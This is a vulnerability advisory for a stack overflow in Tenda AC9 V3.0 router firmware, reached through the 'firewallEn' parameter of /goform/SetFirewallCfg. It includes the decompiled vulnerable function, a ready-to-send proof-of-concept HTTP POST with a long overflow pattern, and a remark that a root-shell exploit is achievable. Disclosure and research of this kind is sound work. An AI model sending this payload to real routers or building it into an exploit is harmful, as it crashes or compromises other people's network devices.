
# Tenda AC9 V3.0BR_V15.03.06.42_multi_TD01 was discovered stack overflow via parameter 'firewall_value' at url /goform/SetFirewallCfg

## Affected Version

US_AC9V3.0BR_V15.03.06.42_multi_TD01

## Firmware Download Address

[AC9V3.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/download/detail-2908.html)

## Vulnerability Description

Tenda AC9 V3.0 BR_V15.03.06.42_multi_TD01 was discovered to contain a stack overflow via parameter 'firewall_value' at url /goform/SetFirewallCfg.

## vulnerability Details

1. This vulnerability lies in the function 'formSetFirwallCfg'，The details are shown below:

```c
void __cdecl formSetFirewallCfg(webs_t wp, char_t *path, char_t *query)
{
  int v3; // $s0
  int v4; // $s0
  int v5; // $s0
  char *wisp_ifname; // [sp+20h] [+20h]
  int sysmode; // [sp+24h] [+24h]
  int connect_type; // [sp+28h] [+28h]
  int wan_num; // [sp+2Ch] [+2Ch]
  int wan_id; // [sp+30h] [+30h]
  unsigned int ddos_bit; // [sp+34h] [+34h]
  _BOOL4 err_code; // [sp+38h] [+38h]
  char *firewall_value; // [sp+3Ch] [+3Ch]
  char firewall_buf[8]; // [sp+40h] [+40h] BYREF
  char old_ddos_buf[64]; // [sp+48h] [+48h] BYREF
  char old_wan_ping_buf[8]; // [sp+88h] [+88h] BYREF
  char mib_name[64]; // [sp+90h] [+90h] BYREF
  char mib_value[64]; // [sp+D0h] [+D0h] BYREF
  char ipopt_map[16]; // [sp+110h] [+110h] BYREF
  char old_map[128]; // [sp+120h] [+120h] BYREF
  char tcp_syn[32]; // [sp+1A0h] [+1A0h] BYREF
  char udp[32]; // [sp+1C0h] [+1C0h] BYREF
  char icmp[32]; // [sp+1E0h] [+1E0h] BYREF
  char old_tcp[32]; // [sp+200h] [+200h] BYREF
  char old_icmp[32]; // [sp+220h] [+220h] BYREF
  char old_udp[32]; // [sp+240h] [+240h] BYREF
  int pps[4]; // [sp+260h] [+260h] BYREF
  u_ddos_data_t ddos; // [sp+270h] [+270h] BYREF
  lan_info_t lan_info; // [sp+280h] [+280h] BYREF
  int wan_double_access_flag; // [sp+298h] [+298h] BYREF
  char wan_ifname[16]; // [sp+29Ch] [+29Ch] BYREF
  char wan_devname[16]; // [sp+2ACh] [+2ACh] BYREF
  char wl24g_work_mode[32]; // [sp+2BCh] [+2BCh] BYREF
  char wl5g_work_mode[32]; // [sp+2DCh] [+2DCh] BYREF

  memset(firewall_buf, 0, sizeof(firewall_buf));
  memset(old_ddos_buf, 0, sizeof(old_ddos_buf));
  memset(old_wan_ping_buf, 0, sizeof(old_wan_ping_buf));
  memset(mib_name, 0, sizeof(mib_name));
  memset(mib_value, 0, sizeof(mib_value));
  memset(ipopt_map, 0, sizeof(ipopt_map));
  memset(old_map, 0, sizeof(old_map));
  memset(tcp_syn, 0, sizeof(tcp_syn));
  memset(udp, 0, sizeof(udp));
  memset(icmp, 0, sizeof(icmp));
  memset(old_tcp, 0, sizeof(old_tcp));
  memset(old_icmp, 0, sizeof(old_icmp));
  memset(old_udp, 0, sizeof(old_udp));
  ddos_bit = 0;
  memset(pps, 0, sizeof(pps));
  memset(&lan_info, 0, sizeof(lan_info));
  firewall_value = websGetVar(wp, "firewallEn", "1111");
  if ( strlen(firewall_value) >= 4 )
  {
    strcpy(firewall_buf, firewall_value);
    GetValue("security.ddos.map", old_ddos_buf);
    GetValue("firewall.pingwan", old_wan_ping_buf);
    sprintf(mib_value, "%c,1500;%c,1500;%c,1500", firewall_buf[0], firewall_buf[2], firewall_buf[1]);
    SetValue("security.ddos.map", mib_value);
    SetValue("firewall.pingwan", &firewall_buf[3]);
    memset(mib_value, (int)&unk_5212F0, sizeof(mib_value));
    if ( GetValue("security.ddos.map", mib_value) )
    {
      if ( sscanf(mib_value, "%[^;];%[^;];%[^;]", icmp, udp, tcp_syn) == 3 )
      {
        if ( icmp[0] == 49 )
        {
          ddos_bit = 4;
          pps[0] = atoi(&icmp[2]);
        }
        if ( udp[0] == 49 )
        {
          ddos_bit |= 2u;
          pps[1] = atoi(&udp[2]);
        }
        if ( tcp_syn[0] == 49 )
        {
          ddos_bit |= 1u;
          pps[2] = atoi(&tcp_syn[2]);
        }
      }
      if ( sscanf(old_ddos_buf, "%[^;];%[^;];%[^;]", old_icmp, old_udp, old_tcp) != 3
        || old_icmp[0] != icmp[0]
        || icmp[0] != 48 && (v3 = pps[0], v3 != atoi(&old_icmp[2]))
        || old_udp[0] != udp[0]
        || udp[0] != 48 && (v4 = pps[1], v4 != atoi(&old_udp[2]))
        || old_tcp[0] != tcp_syn[0]
        || tcp_syn[0] != 48 && (v5 = pps[2], v5 != atoi(&old_tcp[2])) )
      {
        GetValue("security.ipop.map", ipopt_map);
        tpi_arp_ddos_ip_fence_enable(ddos_bit, ipopt_map);
        ddos.status = ddos_bit;
        ddos.icmp_threshold = pps[0];
        ddos.udp_threshold = pps[1];
        ddos.tcp_threshold = pps[2];
        get_ddos_ipopt_lan_info(&lan_info);
        tpi_ddos_ip_lan_info_set(&lan_info);
        tpi_ddos_fence_set(&ddos);
      }
    }
    if ( old_wan_ping_buf[0] != firewall_buf[3] )
    {
      wan_double_access_flag = 0;
      memset(wan_ifname, 0, sizeof(wan_ifname));
      strcpy(wan_devname, "eth1");
      memset(&wan_devname[5], 0, 11);
      memset(wl24g_work_mode, 0, sizeof(wl24g_work_mode));
      memset(wl5g_work_mode, 0, sizeof(wl5g_work_mode));
      GetValue("wl2g.public.mode", wl24g_work_mode);
      GetValue("wl5g.public.mode", wl5g_work_mode);
      if ( !strcmp(wl24g_work_mode, "wisp") || !strcmp(wl5g_work_mode, "wisp") )
      {
        wisp_ifname = (char *)getWispIfName();
        if ( wisp_ifname && *wisp_ifname )
        {
          strcpy(wan_ifname, wisp_ifname);
          if ( firewall_buf[3] == 49 )
          {
            doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
            doSystemCmd("iptables -t filter -I INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
          }
          else
          {
            doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
          }
        }
      }
      else
      {
        GetValue("wans.flag", mib_value);
        wan_num = atoi(mib_value);
        for ( wan_id = 0; wan_id < wan_num; ++wan_id )
        {
          sprintf(mib_name, "wan%d.connecttype", wan_id + 1);
          GetValue(mib_name, mib_value);
          connect_type = atoi(mib_value);
          GetValue("sys.mode", mib_value);
          sysmode = atoi(mib_value);
          tpi_wan_get_ifname(wan_id + 1, sysmode, connect_type, wan_ifname);
          if ( tpi_wan_double_access_check(&wan_double_access_flag) )
            break;
          if ( firewall_buf[3] == 49 )
          {
            if ( wan_double_access_flag == 1 )
            {
              doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
              doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_devname);
              doSystemCmd("iptables -t filter -I INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
              doSystemCmd("iptables -t filter -I INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_devname);
            }
            else
            {
              doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
              doSystemCmd("iptables -t filter -I INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
            }
          }
          else if ( wan_double_access_flag )
          {
            doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
            doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_devname);
          }
          else
          {
            doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
          }
        }
      }
    }
  }
  err_code = CommitCfm() == 0;
  websWrite(wp, "HTTP/1.0 200 OK\r\n\r\n");
  websWrite(wp, "{\"errCode\":%d}", err_code);
  websDone(wp, 200);
}
```

2. in function 'formSetFirwallCfg' line 52, 'firewall_value' is a a user-controlled parameter("firewallEn") and is read in without length check.

![](/images/1_1.png)

Then content of 'firewall_value' is copied into local variable 'firewall_buf', which leads to a stack overflow vulnerability.

![](/images/1_2.png)

## POC

By sending delicately constructed data package as the poc above, we can cause a stack overflow error.

```
POST /goform/SetFirewallCfg HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1515
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/firewall.html?random=0.37882641100369097&
Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbcemy1qw

firewallEn=111aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaeaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaeaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae1
```

you can write exp, which can achieve a very stable effect of obtaining the root shell.

## Author

田文奇
